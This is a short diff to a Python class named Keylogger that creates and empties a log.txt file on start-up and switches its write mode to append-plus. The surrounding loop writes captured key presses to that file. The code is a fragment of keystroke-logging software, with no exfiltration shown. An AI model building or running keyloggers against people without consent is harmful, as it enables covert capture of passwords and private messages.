@@ -8,7 +8,8 @@ class Keylogger():
 
         self.keys = []
         self.lock = lock
-
+        with open("log.txt", "w") as f:
+            pass
 
     def on_press(self,key):
 
@@ -27,7 +28,7 @@ class Keylogger():
 
         self.lock.acquire()
         try:
-            with open("log.txt", "a") as f:
+            with open("log.txt", "a+") as f:
                 for key in self.keys:
                     k = str(key).replace("'","")
                     if k.find("space") > 0:
